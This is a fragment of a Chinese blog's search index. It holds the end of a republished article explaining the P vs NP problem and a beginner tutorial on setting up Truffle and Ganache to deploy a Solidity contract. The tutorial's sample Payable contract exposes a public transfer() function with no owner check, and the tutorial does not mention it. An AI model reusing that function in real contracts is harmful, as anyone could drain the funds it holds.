100000，计算机也只需要 10000 秒就能得到答案，这大约相当于 2 个小时又 47 分钟。\n其实，为了判断出这些物体能否安全叠放，我们似乎完全不必如此煞费心机。我们还有一个更基本的方法：枚举所有可能的叠放顺序，看看有没有满足要求的方案。n 个物体一共会产生 n! 种不同的叠放顺序，每次检验都需要耗费 O(n) 的时间。所以，为了得到答案，最坏情况下的时间复杂度为 O(n · n!)。\n那么，我们为什么不采用这种粗暴豪爽的算法呢？主要原因大概就是，这种算法的时间复杂度有些太高。但是，既然计算机的运算速度如此之快，O(n · n!) 的时间复杂度想必也不在话下吧？让我们来看一看。仍然假设 n = 10 的时候，计算机只需要 0.1 毫秒就能得到答案。\n令人吃惊的是，若真的以 O(n · n!) 的级别增长，到了 n = 15 的时候，完成算法全过程需要的时间就已经增加到了 54 秒。当 n = 20 时，算法全过程耗时 1.34 亿秒，这相当于 1551 天，也就是 4.25 年。当 n = 30 时，算法全过程耗时 700 万亿年，而目前的资料显示，宇宙大爆炸也不过是在 137 亿年以前。\n如果 n = 100 的话，计算机需要不分昼夜地工作 8.15 × 10140 年才能得到答案。根据目前的宇宙学理论，到了那个时候，整个宇宙早已一片死寂。\n为什么 O(n2) 和 O(n · n!) 的差异那么大呢？原因就是，前者毕竟属于多项式级的增长，后者则已经超过了指数级的增长。\n指数级的增长真的非常可怕，虽然 n 较小的时候看上去似乎很平常，但它很快就会超出你的想象，完全处于失控状态。一张纸对折一次会变成 2 层，再对折一次会变成 4 层……如此下去，每对折一次这个数目便会翻一倍。\n因此，一张纸对折了 n 次后，你就能得到 2n 层纸。当 n = 5 时，纸张层数 2n = 32；当 n = 10 时，纸张层数瞬间变成了 1024；当 n = 30 时，你面前将出现 230 = 1 073 741 824 层纸！一张纸的厚度大约是 0.1 毫米，这十亿多张纸叠加在一起，也就有 10 万多米。\n卡门线（Kármán line）位于海拔 100 千米处，是国际标准规定的外太空与地球大气层的界线。这表明，把一张纸对折 30 次以后，其总高度将会超出地球的大气层，直达外太空。\n波斯史诗《王书》记载的故事也形象地道出了指数级增长的猛烈程度。一位智者发明了国际象棋，国王想要奖赏他，问他想要什么。智者说：“在这个棋盘的第一个格子里放上一颗大米，第二个格子里放上两颗大米，第三个格子里放上四颗大米，以此类推，每个格子里的大米数都是前一个格子的两倍。所有 64 个格子里的大米就是我想要的奖赏了。”国王觉得这很容易办到，便欣然同意了。\n殊不知，哪怕只看第 64 个格子里的大米，就已经有 263 ≈ 9.22 × 1019 颗了。如果把这些大米分给当时世界上的每个人，那么每一个人都会得到上千吨大米。国际象棋的棋盘里幸好只有 64 个格子。如果国际象棋的棋盘里有 300 个格子，里面的大米颗数就会超过全宇宙的原子总数了。\n因而，在计算机算法领域，我们有一个最基本的假设：所有实用的、快速的、高效的算法，其时间复杂度都应该是多项式级别的。 因此，在为计算机编写程序解决实际问题时，我们往往希望算法的时间复杂度是多项式级别的。\n这里的“问题”一词太过宽泛，可能会带来很多麻烦，因而我们规定，接下来所说的问题都是指的“判定性问题”（decision problem），即那些给定某些数据之后，要求回答“是”或者“否”的问题。\n在复杂度理论中，如果某个判定性问题可以用计算机在多项式级别的时间内解出，我们就说这个问题是一个 P 问题，或者说它属于集合 P。这里，P 是“多项式”的英文单词 polynomial 的第一个字母。之前那个叠放东西的问题，就是一个 P 问题。\n历史上至少有过两个问题，它们看起来非常困难，非常不像 P 问题，但在人们的不懈努力之下，最终还是成功地加入了 P 问题的大家庭。其中一个是线性规划（linear programming），它是一种起源于二战时期的运筹学模型。\n1947 年，乔治·丹齐格（George Dantzig）提出了一种非常漂亮的算法叫作“单纯形法”（simplex algorithm），它在随机数据中的表现极为不错，但在最坏情况下却需要耗费指数级的时间。因此，很长一段时间，人们都在怀疑，线性规划是否有多项式级的算法。直到 1979 年，人们才迎来了线性规划的第一个多项式级的算法，它是由前苏联数学家列昂尼德·哈奇扬（Leonid Khachiyan）提出的。\n另外一个问题则是质数判定问题（primality test）：判断一个正整数是否是质数（prime），或者说判断一个正整数是不是无法分成两个更小的正整数之积。人们曾经提出过各种质数判定的多项式级算法，但它们要么是基于概率的，要么是基于某些假设的，要么是有一定适用范围的。\n2002 年，来自印度理工学院坎普尔分校的阿格拉瓦尔（M. Agrawal）、卡亚勒（N. Kayal）和萨克斯泰纳（N. Saxena）发表了一篇重要的论文《PRIMES is in P》，给出了第一个确定性的、时间复杂度为多项式级别的质数判定算法，质数判定问题便也归入了 P 问题的集合。\n同时，我们也有很多游离于集合 P 之外的问题。互联网安全高度依赖于一种叫作 RSA 算法的加密体系，里面用到了非常犀利的一点：在整数世界里，合成与分解的难度是不对等的。\n任意选两个比较大的质数，比如 19 394 489 和 27 687 937。我们能够很容易计算出它俩相乘的结果，它等于 536 993 389 579 193；但是，如果反过来问你，536 993 389 579 193 可以分解成哪两个质数的乘积，这却非常难以迅速作答。把一个大整数分解成若干个质数之积，这就是著名的“整数分解问题”（integer factorization problem）。\n目前，人们还没有找到一种快速有效的整数分解算法。也就是说，目前人们还不知道整数分解问题是否属于 P。（这里我们指的也是整数分解问题的判定性版本，即给定一个正整数 N 和一个小于 N 的正整数 M，判断出 N 是否能被某个不超过 M 的数整除。）人们猜测，整数分解很可能不属于 P。这正是 RSA 算法目前足够安全的原因。\n另一个著名的问题叫作“子集和问题”（subset sum problem）：给定一个整数集合 S 以及一个大整数 M，判断出能否在 S 里选出一些数，使得它们的和正好为 M？比方说，假设集合 S 为\n{38, 71, 45, 86, 68, 65, 82, 89, 84, 85, 91, 8}\n并且大整数 M = 277，那么你就需要判断出，能否在上面这一行数里选出若干个数，使得它们相加之后正好等于 277。为了解决这类问题，其中一种算法就是，枚举所有可能的选数方案，看看有没有满足要求的方案。\n如果我们用 n 来表示集合里的元素个数，那么所有可能的选数方案就有 O(2n) 种，检验每一种方案都需要花费 O(n) 的时间，因而整个算法的时间复杂度为 O(n · 2n)。虽然人们已经找到了时间复杂度更低的算法，但没有一种算法的时间复杂度是多项式级别的。人们猜测，子集和问题很可能也不属于 P。\n美国计算机科学家杰克·埃德蒙兹（Jack Edmonds）在 1964 年的一篇讨论某个矩阵问题的论文中，也提到了类似于 P 问题的概念：“当然，给定一个矩阵后，考虑所有可能的染色方案，我们一定能碰上一个符合要求的剖分，但这种方法所需要的工作量大得惊人。\n我们要寻找一种算法，使得随着矩阵大小的增加，工作量仅仅是呈代数式地上涨……和大多数组合问题一样，找出一个有限的算法很容易，找出一个满足上述条件的，从而能在实际中运用的算法，就不那么容易了。”\n接下来，埃德蒙兹模模糊糊地触碰到了一个新的概念：“给定一个矩阵，它的各列最少能被剖分成多少个独立集？我们试着找出一个好的刻画方式。至于什么叫作‘好的刻画’，我们则采用‘绝对主管原则’。一个好的刻画，应该能透露出矩阵的某些信息，使得某个主管能够在助手找到一个最小的剖分方案之后，轻易地验证出这确实是最小的剖分方案。\n有了一个好的刻画，并不意味着就有一个好的算法。助手很可能还是得拼死拼活，才能找到那个剖分方案。”\n埃德蒙兹后面所说的，不是设计一种多项式级的算法来寻找答案，而是设计一种多项式级的算法来验证答案的正确性。对于很多问题，这件事情是很好办的。为了向人们展示出确实有可能让所有的物体都不被压坏，我们只需要给出一种满足要求的物体叠放顺序，并让计算机用 O(n) 的时间验证它的确满足要求即可。为了向人们展示出集合中的某些数加起来能得出 277，我们只需要提供一种选数的方法，并让计算机用 O(n) 的时间求和检验。\n对于有些问题来说，如果答案是肯定的，我们可能并没有一种非常明显的高效方法来检验这一点。不过，很容易看出，找出一个多项式级的答案验核算法，再怎么也比找出一个多项式级的答案获取算法更容易。很多看上去非常困难的问题，都是先找到多项式级的答案验核算法，再找到多项式级的答案获取算法的。\n一个经典的例子就是质数判定问题。如果某个数确实是一个质数，你怎样才能在多项式级的时间里证明这一点？1975 年，沃恩·普拉特（Vaughan Pratt）在《每个质数都有一份简短的证明书》（Every Prime Has a Succinct Certificate）一文中给出了一种这样的方法，无疑推动了质数判定算法的发展。\n还有些问题是如此之难，以至于目前人们不但没有找到多项式级的答案获取算法，而且还不知道是否存在多项式级的答案验核算法。\n比如经典的“第 K 大子集问题”（Kth largest subset problem）：给定一个含有 n 个整数的集合 S，一个大整数 M，以及一个不超过 2n 的整数 K，判断出是否存在至少 K 个不同的子集，使得每个子集里的元素之和都不超过 M？\n如果答案是肯定的，一个很容易想到的验证方法便是，把所有满足要求的 K 个子集都列出来，并交由计算机审核。只可惜，子集的数目是指数级的，因而审核工作也将会花费指数级的时间。人们猜测，第 K 大子集问题很可能没有多项式级别的检验方法。\n在复杂度理论中，一个问题有没有高效的答案验核算法，也是一个非常重要的研究课题。对于一个判定性问题，如果存在一个多项式级的算法，使得每次遇到答案应为“是”的时候，我们都能向这个算法输入一段适当的“证据”，让算法运行完毕后就能确信答案确实为“是”，我们就说这个问题是一个 NP 问题，或者说它属于集合 NP。为了解释“NP 问题”这个名字的来由，我们不得不提到 NP 问题的另一个等价定义：可以在具备随机功能的机器上用多项式级的时间解决的问题。\n如果允许计算机的指令发生冲突，比如指令集里面既有 “如果遇到情况 A，则执行操作 B”，又有 “如果遇到情况 A，则执行操作 C”，我们就认为这样的计算机具备了随机的功能。这种新型的计算机就叫作“非确定型”（nondeterministic）机器。\n机器一旦遇到了矛盾纠结之处，就随机选择一条指令执行。你可以把机器面对的每一次随机选择都想象成是一个通向各个平行世界的岔路口，因而整台机器可以同时试遍所有的分支，自动探寻所有的可能。\n如果你看过尼古拉斯·凯奇（Nicolas Cage）主演的电影《预见未来》（Next），你或许会对这一幕非常熟悉。只要在任意一个分支里机器回答了“是”，那么整台机器也就算作回答了“是”。\n在如此强大的机器上，很多问题都不是问题了。为了判断出能否让所有的物体都不被压坏，我们只需要让机器每次都从剩余物体中随便选一个放，看看由此产生的 n! 种放法里是否有哪种放法符合要求。为了判断出集合中是否有某些数加起来等于 277，我们只需要让机器随机决定每个数该选还是不选，最后看看有没有哪次选出来的数之和正好是 277。\n事实上，在非确定型计算机上可以用多项式级的时间获取到答案的问题，正是那些在确定型计算机上可以用多项式级的时间验核答案的问题，原因很简单：如果一个问题可以在非确定型计算机上获解，找到解的那个分支沿途做出的选择就成了展示答案正确性的最有力证据；反之，如果我们能在确定型计算机上验核出答案确实为“是”，我们便可以在非确定型计算机上随机产生验核所需的证据，看看在所有可能的证据当中会不会出现一条真的能通过验核的证据。\n“非确定型”的英文单词是 nondeterministic，它的第一个字母是 N；“多项式”的英文单词是 polynomial，它的第一个字母是 P。NP 问题便如此得名。\n容易想到，所有的 P 问题一定都是 NP 问题，但反过来就不好说了。例如，子集和问题是属于 NP 的。然而，之前我们就曾经讨论过，人们不但没有找到子集和问题的多项式级解法，而且也相信子集和问题恐怕根本就没有多项式级的解法。因而，子集和问题很可能属于这么一种类型的问题：它属于集合 NP，却不属于集合 P。\n1971 年，史提芬·古克（Stephen Cook）发表了计算机科学领域最重要的论文之一——《定理证明过程的复杂性》（The Complexity of Theorem-Proving Procedures）。在这篇论文里，史提芬·古克提出了一个著名的问题：P 等于 NP 吗？\n如果非要用一句最简单、最直观的话来描述这个问题，那就是：能高效地检验解的正确性，是否就意味着能高效地找出一个解？数十年来，无数的学者向这个问题发起了无数次进攻。根据格哈德·韦金格（Gerhard Woeginger）的统计，仅从 1996 年算起，就有 100 余人声称解决了这个问题，其中 55 人声称 P 是等于 NP 的，另外 45 人声称 P 是不等于 NP 的，还有若干人声称这个问题理论上不可能被解决。\n但不出所料的是，所有这些“证明”都是错误的。目前为止，既没有人真正地证明了 P = NP，也没有人真正地证明了 P ≠ NP，也没有人真正地证明了这个问题的不可解性。这个问题毫无疑问地成为了计算机科学领域最大的未解之谜。\n在 2000 年美国克雷数学研究所（Clay Mathematics Institute）公布的千禧年七大数学难题（Millennium Prize Problems）中，P 和 NP 问题排在了第一位。第一个解决该问题的人将会获得一百万美元的奖金。\n让我们来看一下，科学家们都是怎么看 P 和 NP 问题的吧。英国数学家、生命游戏（Game of Life）的发明者约翰·康威（John Conway）认为，P 是不等于 NP 的，并且到了 21 世纪 30 年代就会有人证明这一点。他说道：“我觉得这本来不应该是什么难题，只是这个理论来得太迟，我们还没有弄出任何解决问题的工具。”\n美国计算机科学家、1985 年图灵奖获得者理查德·卡普（Richard Karp）也认为，P 是不等于 NP 的。他说：“我认为传统的证明方法是远远不够的，解决这个问题需要一种绝对新奇的手段。直觉告诉我，这个问题最终会由一位不被传统思想束缚的年轻科学家解决掉。”\n美国计算机科学家、《自动机理论、语言和计算导论》（Introduction to Automata Theory, Languages and Computation）的作者杰夫瑞·厄尔曼（Jeffrey Ullman）同样相信 P 不等于 NP。他说：“我认为这个问题和那些困扰人类上百年的数学难题有得一拼，比如四色定理（four color theorem）。\n所以我猜测，解决这个问题至少还要 100 年。我敢肯定，解决问题所需的工具至今仍未出现，甚至连这种工具的名字都还没有出现。但别忘了，那些最伟大的数学难题刚被提出来的 30 年里，所面对的也是这样的情况。”\n你或许会注意到，大家似乎都倾向于认为 P ≠ NP 。事实上，根据威廉·加萨奇（William Gasarch）的调查，超过八成的学者都认为 P ≠ NP。这至少有两个主要的原因。首先，证明 P = NP 看上去比证明 P ≠ NP 更容易，但即使这样，目前仍然没有任何迹象表明 P = NP。\n为了证明 P = NP，我们只需要构造一种可以适用于一切 NP 问题的超级万能的多项式级求解算法。在那篇划时代的论文里，史提芬·古克证明了一个颇有些出人意料的结论，让 P = NP 的构造性证明看起来更加唾手可得。给你一堆正整数，问能否把它们分成总和相等的两堆，这个问题叫作“分区问题”（partition problem）。\n容易看出，分区问题可以转化为子集和问题的一个特例，你只需要把子集和问题中的目标设定成所有数之和的一半即可。这说明，子集和问题是一个比分区问题更一般的“大问题”，它可以用来解决包括分区问题在内的很多“小问题”。\n史提芬·古克则证明了，在 NP 问题的集合里，存在至少一个最“大”的问题，它的表达能力如此之强，以至于一切 NP 问题都可以在多项式的时间里变成这个问题的一种特例。\n很容易想到，如果这样的“终极 NP 问题”有了多项式级的求解算法，所有的 NP 问题都将拥有多项式级的求解算法。这样的问题就叫作“NP 完全问题”（NP-complete problem）。在论文中，史提芬·古克构造出了一个具体的 NP 完全问题，它涉及到了很多计算机底层的逻辑运算，能蕴含所有的 NP 问题其实也不是非常奇怪的事。\n后来，人们还找到了很多其他的 NP 完全问题。1972 年，理查德·卡普发表了《组合问题中的可归约性》（Reducibility among Combinatorial Problems）一文。这是复杂度理论当中又一篇里程碑式的论文，“P 问题”、“NP 问题”、“NP 完全问题”等术语就在这里诞生。\n在这篇论文里，理查德·卡普列出了 21 个 NP 完全问题，其中不乏一些看起来很“正常”、很“自然”的问题，刚才提到的子集和问题就是其中之一。\n1979 年，迈克尔·加里（Michael Garey）和戴维·约翰逊（David Johnson）合作出版了第一本与 NP 完全问题理论相关的教材——《计算机和难解性：NP 完全性理论导引》（Computers and Intractability: A Guide to the Theory of NP-Completeness）。该书的附录中列出了超过 300 个 NP 完全问题，这一共用去了 100 页的篇幅，几乎占了整本书的三分之一。\n如果这些 NP 完全问题当中的任何一个问题拥有了多项式级的求解算法，所有的 NP 问题都将自动地获得多项式级的求解算法，P 也就等于 NP 了。然而，这么多年过去了，没有任何人找到任何一个 NP 完全问题的任何一种多项式解法。这让人们不得不转而相信，P 是不等于 NP 的。\n人们相信 P ≠ NP 的另一个原因是，这个假设经受住了实践的考验。工业与生活中的诸多方面都依赖于 P ≠ NP 的假设。如果哪一天科学家们证明了 P = NP，寻找一个解和验证一个解变得同样容易，这个世界将会大不一样。1995 年，鲁塞尔·因帕利亚佐（Russell Impagliazzo）对此做了一番生动描述。\n首先，各种各样的 NP 问题，尤其是那些最为困难的 NP 完全问题，都将全部获得多项式级的解法。工业上、管理上的几乎所有最优化问题都立即有了高效的求解方案。事实上，我们甚至不需要编程告诉计算机应该怎样求解问题，我们只需要编程告诉计算机我们想要什么样的解，编译器将会自动为我们做好一个高效的求解系统。\n其次，很多人工智能问题也迎刃而解了。比方说，为了让计算机具备中文处理能力，我们可以准备一个训练集，里面包含一大批句子样本，每个句子都带有“符合语法”、“不符合语法”这两种标记之一。\n接下来，我们要求计算机构造一个代码长度最短的程序，使得将这些语句输入这个程序后，程序能正确得出它们是否符合语法。显然，这个最优化问题本身是一个 NP 问题（这里有个前提，即这样的程序是存在的，并且是多项式级别的），因此计算机可以在多项式时间内找到这个最简程序。\n根据奥卡姆剃刀原理（Occam’s razor），我们有理由相信，这个程序背后的算法也就是人类头脑中正在使用的算法，因此它能够适用于所给材料之外的其他语句，并具有自我学习的功能。\n数学家的很多工作也可以完全交给计算机来处理。寻找一个反例和验证一个反例变得同样简单，各种错误的猜想都将很快被推翻。事实上，寻找一个数学证明和验证一个证明的正确性也变得同样简单，因此各种正确的命题也能够很快找到一个最简的证明。\n最后，不要高兴得太早——P = NP 的世界也将会是一个极不安全的世界。电子签名技术不再有效，因为伪造一段合法的签名变得和验证签名是否合法一样轻松。RSA 算法也不再有效，因为寻找一个质因数变得和判断整除性一样简单。事实上，发明任何新的密码算法都是徒劳——计算机可以根据一大批明文密文样本推算出生成密文的算法（只要这个算法本身是多项式的）。\n更进一步，在网络上，你再也没法把人和人区别开来，甚至没法把人和计算机区别开来。计算机不仅能轻易通过图灵测试（Turing test），还能精确地模仿某一个特定的人。\n如果你能把某个人的网络聊天记录全部搜集起来，把这个人和网友们的对话全部递交给计算机，计算机将会很快学会如何模仿这个人。网络的身份鉴定必须要借助物理手段。即使是在科幻故事中，这样的设定也相当疯狂，可见 P = NP 有多不可能了。\n虽然种种证据表明 P ≠ NP，但我们仍然无法排除 P = NP 的可能性。其实，如果 P 真的等于 NP，但时间复杂度的次数非常大非常大非常大，密码学的根基仍然不太可能动摇，我们的世界仍然不太可能大变。被誉为“算法分析之父”的计算机科学大师高德纳（Donald Knuth）还提出了这样一种可能：未来有人利用反证法证明了 P = NP，于是我们知道了所有 NP 问题都有多项式级的算法，但算法的时间复杂度究竟是多少，我们仍然一无所知！\n对于很多人来说，找不到任何一个 NP 完全问题的多项式级算法，同样不应成为质疑 P = NP 的理由。荻原光德（Mitsunori Ogihara）认为，最终人们或许会成功地证明 P = NP，但这绝不是一两个人死死纠缠某一个 NP 完全问题就能办到的。对此，他做了更为细致的想象。\nXX 世纪后期，一份非常简略的、从未发表过的草稿，无意中开辟了解决 P 和 NP 问题的道路。这份草稿出自 20 世纪的一位数学天才 FOO 之手，当时他正在尝试着建立某种代数结构的新理论。显然，FOO 很快放弃了这个想法，并且今后从未重新拾起这个课题。这份草稿一直卡在 FOO 的卧室地板的缝隙里，在后来的一次旧房翻新工程中才被工人们发现。\n由于草稿太过简略，因而当时并未引起太多关注。然而，几十年后，一群数学家发现，如果草稿上面的某个假设的某个变形成立，将会推出很多有意思的东西。虽然这不是 FOO 本来要做的假设，但它还是被人们称作“FOO 假设”，以纪念这位数学天才。\n大约 100 年后，一群计算机科学家发现，如果 FOO 假设成立，那么某个特定的代数问题 Q 将会成为一个 NP 完全问题。几年后，计算机科学家们再次发现，如果（届时已经非常有名的）BAR 猜想成立，那么 Q 将会拥有多项式级的算法。把两者结合起来，于是得到：如果 FOO 和 BAR 都成立，那么 P = NP。\n接下来的两个世纪里，这两个猜想都有了相当充分的研究。人们不断地得出各式各样的部分结果，剩余的特例则被转化为新的形式，直至每个猜想都被归为一句非常简明、非常具体的命题。最终，两组人马相继宣布，这两个命题都是正确的。第一组人马在 FOO 的诞辰前三周宣布，他们终于攻克了 BAR 猜想的最后一环。三个月后，第二组人马宣布，FOO 猜想正式得以解决。\n未来究竟会发生什么？让我们拭目以待。\n","link":"https://weizhang555.github.io/republish/pnp-problem/","section":"republish","tags":["P\u0026NP"],"title":"转载：著名的 P=NP 问题到底是什么"},{"body":"","link":"https://weizhang555.github.io/original/","section":"original","tags":null,"title":"Originals"},{"body":"怎样开始Solidity的学习 最近在学习区块链、智能合约相关知识，发现Solidity权威的学习资料很匮乏，很奇怪Solidity这么火竟然没有官方的详细学习资料，比如《Solidity Cookbook》这类书籍。\n这篇文章是Solidity入门的入门文档，介绍如何搭建本地环境搭建。我个人也是新手，多年的语言学习体验还是习惯先有个本地的开发环境，Ethereum官方推荐的学习工具列举在下面：https://ethereum.org/zh/developers/learning-tools/ ，其中Remix我看到很多人在推荐，如果喜欢在线编码的话可以直接使用。\n另外，Solidity的入门学习材料推荐以下两个：\nCryptoZombie 讲的很泛但是方方面面都介绍到了，很适合建立初步的体感。 Solidity By Example 我正在看，例子很多，但是貌似也没有介绍的很深入。 需要更加Advanced的学习资料。 Solidity本地环境我个人选择Truffle，我也是新手，如果大家有更好的推荐可以在评论区推荐给我，谢谢~\nTruffle环境搭建 主要参考Truffle官方Quick Start：https://trufflesuite.com/docs/truffle/quickstart/\n安装很简单：\n1$ npm install -g truffle 强烈推荐安装Ganache，Ganache可以在本地启动一个带UI的eth链，带10个测试账号，每个账号有100个eth供测试用。\n虽然Truffle也会启动本地的eth测试链，但是有个UI界面的Ganache还是很直观的，方便学习。\nGanache建议安装支持Filecoin的最新版本，虽然我们还没用到Filecoin，但是提前准备总是没错的。\n参考：https://trufflesuite.com/docs/ganache/quickstart/#1-install-ganache\n所有可用的版本列表：https://github.com/trufflesuite/ganache-ui/releases\n手动安装最新版本，我用的版本是2.6.0-beta.3.1390，下载地址\nTruffle一些操作技巧及常用命令 参考：https://trufflesuite.com/docs/truffle/quickstart/\nTruffle Quick Start里面的例子使用的MetaCoin，我们这里从truffle init开始建一个新的truffle工程。\n1. 创建工程 1$ mkdir test 2$ cd test 3$ truffle init 查看目录树：\n1$ tree . 2. 3├── contracts 4│ └── Migrations.sol 5├── migrations 6│ └── 1_initial_migration.js 7├── test 8└── truffle-config.js 9\\ 10 113 directories, 3 files 2. 启动Ganache测试链 3. 配置Truffle Project连接到Ganache UI 图片里可以看到，Ganache的监听地址为http://127.0.0.1:7545 ，我们把这个地址配置到truffle-config.js里。\n1module.exports = { 2 ... 3 networks: { 4 development: { 5 host: \u0026#34;127.0.0.1\u0026#34;, // Localhost (default: none) 6 port: 7545, // Standard Ethereum port (default: none) 7 network_id: \u0026#34;*\u0026#34;, // Any network (default: none) 8 } 9 }, 10 ... 11} 启动truffle console测试下是否成功：\n1$ truffle console 2truffle(development)\u0026gt; let accounts = await web3.eth.getAccounts() 3undefined 4truffle(development)\u0026gt; accounts 5[ 6 \u0026#39;0xf0Ac7625E3D35B2eed3b6D96E3aeebeCBC5af091\u0026#39;, 7 \u0026#39;0x44CEfACE09E51dadAcaf153CE4f6Da90873D176c\u0026#39;, 8 \u0026#39;0x5E7DFEEDA81e3734B756c429dBE291Ad0a773Ef5\u0026#39;, 9 \u0026#39;0x357FAd25d64B1f66C5A1BD69bd57ce7f1846D203\u0026#39;, 10 \u0026#39;0xaca05A86BEB9D9D91a73B092E747eAbc0b629c1f\u0026#39;, 11 \u0026#39;0x10159311037dECc9aBCc32EEB1F5F93d8Db5fc02\u0026#39;, 12 \u0026#39;0x2B8D12e9A5E44C64673bDA343F5d5Db66752bcE0\u0026#39;, 13 \u0026#39;0x9581F92090bf2985e105d6Eb90cC1afFE05e6a34\u0026#39;, 14 \u0026#39;0xAB3DF6FEA353D55c64c5aC206D40f9eFa951DACf\u0026#39;, 15 \u0026#39;0x6587A514e15e59c7F8fb2Bfc0824707ba77004c2\u0026#39; 16] 17truffle(development)\u0026gt;.exit 注意用await关键字保障等待异步操作能正确返回。因为账户的生成是随机的，所以上面你的10个账户和我的不会相同。\n4. 开发和部署新合约的一个示例 我们以https://solidity-by-example.org/payable 这里的一个example做示范，这个example里面包含了合约付款，是个不错的演示程序。\n编写新合约 contracts/Payable.sol\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.13; 3 4contract Payable { 5 // Payable address can receive Ether 6 address payable public owner; 7 8 // Payable constructor can receive Ether 9 constructor() payable { 10 owner = payable(msg.sender); 11 } 12 13 // Function to deposit Ether into this contract. 14 // Call this function along with some Ether. 15 // The balance of this contract will be automatically updated. 16 function deposit() public payable {} 17 18 // Call this function along with some Ether. 19 // The function will throw an error since this function is not payable. 20 function notPayable() public {} 21 22 // Function to withdraw all Ether from this contract. 23 function withdraw() public { 24 // get the amount of Ether stored in this contract 25 uint amount = address(this).balance; 26 27 // send all Ether to owner 28 // Owner can receive Ether since the address of owner is payable 29 (bool success, ) = owner.call{value: amount}(\u0026#34;\u0026#34;); 30 require(success, \u0026#34;Failed to send Ether\u0026#34;); 31 } 32 33 // Function to transfer Ether from this contract to address from input 34 function transfer(address payable _to, uint _amount) public { 35 // Note that \u0026#34;to\u0026#34; is declared as payable 36 (bool success, ) = _to.call{value: _amount}(\u0026#34;\u0026#34;); 37 require(success, \u0026#34;Failed to send Ether\u0026#34;); 38 } 39} 大致讲解下：\ndeposit：存eth进合约。 notPayable: 调用这个函数时不可以付钱。 withdraw：把这个合约内的所有钱都打给合约的owner。 transfer：从这个合约里转移一定数额的钱给指定账户。 编写migration文件。 migration文件是指导truffle如何部署合约的文件，具体原理还没深入看过，目测是truffle会先部署一个deploy用的合约，后面的合约会借助这个deployer来做。\nmigrations/2_payable_migration.js\n1const Payable = artifacts.require(\u0026#34;Payable\u0026#34;); 2 3module.exports = function (deployer) { 4 deployer.deploy(Payable); 5}; 部署 可以在命令行执行truffle migrate，或是在truffle console里执行migrate即可。\n1$ truffle migrate 2 3Compiling your contracts... 4=========================== 5\u0026gt; Compiling ./contracts/Migrations.sol 6\u0026gt; Compiling ./contracts/Payable.sol 7\u0026gt; Artifacts written to /Users/zhangwei/program/crypto/test/build/contracts 8\u0026gt; Compiled successfully using: 9 - solc: 0.8.13+commit.abaa5c0e.Emscripten.clang 10 11 12Starting migrations... 13====================== 14\u0026gt; Network name: \u0026#39;development\u0026#39; 15\u0026gt; Network id: 5777 16\u0026gt; Block gas limit: 6721975 (0x6691b7) 17 18 191_initial_migration.js 20====================== 21 22 Deploying \u0026#39;Migrations\u0026#39; 23 ---------------------- 24 \u0026gt; transaction hash: 0xc5612b8e2f3c1f59627085ecfe1bbfd02f8426245e231ebcf6320b7676d46c23 25 \u0026gt; Blocks: 0 Seconds: 0 26 \u0026gt; contract address: 0xedF2d3b63b29bdE8ab015f7c306877BEE162eb23 27 \u0026gt; block number: 1 28 \u0026gt; block timestamp: 1654262832 29 \u0026gt; account: 0xf0Ac7625E3D35B2eed3b6D96E3aeebeCBC5af091 30 \u0026gt; balance: 99.99502292 31 \u0026gt; gas used: 248854 (0x3cc16) 32 \u0026gt; gas price: 20 gwei 33 \u0026gt; value sent: 0 ETH 34 \u0026gt; total cost: 0.00497708 ETH 35 36 \u0026gt; Saving migration to chain. 37 \u0026gt; Saving artifacts 38 ------------------------------------- 39 \u0026gt; Total cost: 0.00497708 ETH 40 41 422_payable_migration.js 43====================== 44 45 Deploying \u0026#39;Payable\u0026#39; 46 ------------------- 47 \u0026gt; transaction hash: 0x4e6ec2f7b722deea05d0f9108d66b8b8a7e15877bb7b6a4bc2b77e34271b1a9e 48 \u0026gt; Blocks: 0 Seconds: 0 49 \u0026gt; contract address: 0x767836195C5A17217B3eeb2a9D2Fbe239B7Ea28D 50 \u0026gt; block number: 3 51 \u0026gt; block timestamp: 1654262832 52 \u0026gt; account: 0xf0Ac7625E3D35B2eed3b6D96E3aeebeCBC5af091 53 \u0026gt; balance: 99.98769456 54 \u0026gt; gas used: 323905 (0x4f141) 55 \u0026gt; gas price: 20 gwei 56 \u0026gt; value sent: 0 ETH 57 \u0026gt; total cost: 0.0064781 ETH 58 59 \u0026gt; Saving migration to chain. 60 \u0026gt; Saving artifacts 61 ------------------------------------- 62 \u0026gt; Total cost: 0.0064781 ETH 63 64Summary 65======= 66\u0026gt; Total deployments: 2 67\u0026gt; Final cost: 0.01145518 ETH 5. 与你的新合约交互 展示一下如何与你的合约交互，及一些常用的操作方法。\n1$ truffle console 2truffle(development)\u0026gt; let accounts = await web3.eth.getAccounts() 3undefined 4truffle(development)\u0026gt; let instance = await Payable.deployed() 5undefined 6 7// accounts[1]存入3 ether，1 ether==10^18 wei 8truffle(development)\u0026gt; instance.deposit({from:accounts[1], value:\u0026#34;3000000000000000000\u0026#34;}) 9...... 注意，第一个合约只有99.99eth，0.01eth是在部署合约时作为Gas费燃烧掉了。 继续：\n1// 从合约里转移2ether给accounts[2] 2truffle(development)\u0026gt; instance.transfer(accounts[2], \u0026#34;2000000000000000000\u0026#34;) 继续：\n1// 剩下的所有钱（1eth）全部提取出来给owner（account[0]） 2truffle(development)\u0026gt; instance.withdraw() 6. Truffle操作小技巧 wei转换为eth 1web3.utils.fromWei(\u0026#34;1000000000000000000\u0026#34;, \u0026#39;ether\u0026#39;) 结果为'1'\neth转换为wei 1web3.utils.toWei(\u0026#34;1\u0026#34;, \u0026#39;ether\u0026#39;) 结果：'1000000000000000000'\nweb3.utils有很多有用的JS函数，在truffle console中敲入web3.utils. 按两次tab键可以看到：\n1web3.utils.__proto__ web3.utils.constructor web3.utils.hasOwnProperty 2web3.utils.isPrototypeOf web3.utils.propertyIsEnumerable web3.utils.toLocaleString 3web3.utils.toString web3.utils.valueOf 4 5web3.utils.BN web3.utils._fireError web3.utils._flattenTypes 6web3.utils._jsonInterfaceMethodToString web3.utils.asciiToHex web3.utils.bytesToHex 7web3.utils.checkAddressChecksum web3.utils.compareBlockNumbers web3.utils.encodePacked 8web3.utils.fromAscii web3.utils.fromDecimal web3.utils.fromUtf8 9web3.utils.fromWei web3.utils.hexToAscii web3.utils.hexToBytes 10web3.utils.hexToNumber web3.utils.hexToNumberString web3.utils.hexToString 11web3.utils.hexToUtf8 web3.utils.isAddress web3.utils.isBN 12web3.utils.isBigNumber web3.utils.isBloom web3.utils.isContractAddressInBloom 13web3.utils.isHex web3.utils.isHexStrict web3.utils.isInBloom 14web3.utils.isTopic web3.utils.isTopicInBloom 